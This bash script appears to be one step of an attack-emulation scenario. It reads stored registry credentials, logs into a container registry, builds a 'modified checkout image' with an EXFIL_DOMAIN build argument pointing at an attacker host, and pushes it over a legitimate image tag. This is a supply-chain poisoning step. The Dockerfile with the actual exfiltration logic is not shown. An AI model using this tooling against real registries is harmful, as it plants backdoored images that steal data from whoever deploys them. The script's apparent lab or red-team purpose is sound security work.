#!/usr/bin/env bash
set -eu

if [ -f "${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh" ]; then
  # Prefer the shared helper when the script runs inside the attacker image.
  source "${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh"
else
  require_tools() {
    local missing=()
    local tool
    for tool in "$@"; do
      command -v "$tool" >/dev/null 2>&1 || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
      echo "Missing required tools: ${missing[*]}" >&2
      exit 1
    fi
  }
fi

require_tools docker cat

DATA_DIR="${DATA_PATH:-/tmp/KCData}/KC2"
REGISTRY_ENDPOINT="${REGISTRY_NAME:-registry}:${REGISTRY_PORT:-5000}"
BASE_TAG="${CHECKOUT_BASE_TAG:-${IMAGE_VERSION:-2.0.2}}"
TARGET_TAG="${CHECKOUT_IMAGE_TAG:-2.0.3}"
USER_FILE="$DATA_DIR/user"
PASS_FILE="$DATA_DIR/pass"
DOCKERFILE="/utils/checkout/Dockerfile"
CONTEXT="/utils/checkout"
IMAGE_REF="$REGISTRY_ENDPOINT/checkout:$TARGET_TAG"

test -s "$USER_FILE"
test -s "$PASS_FILE"
test -f "$DOCKERFILE"

echo "[KC2-206] building modified checkout image $IMAGE_REF"
cat "$PASS_FILE" | docker login "$REGISTRY_ENDPOINT" -u "$(cat "$USER_FILE")" --password-stdin >/dev/null
docker build \
  --build-arg "EXFIL_DOMAIN=${ATTACKERADDR:-attacker}" \
  --build-arg "BASE_IMAGE=$REGISTRY_ENDPOINT/checkout:$BASE_TAG" \
  -f "$DOCKERFILE" \
  -t "$IMAGE_REF" \
  "$CONTEXT" >/dev/null
docker push "$IMAGE_REF" >/dev/null
echo "[KC2-206] modified checkout image pushed"
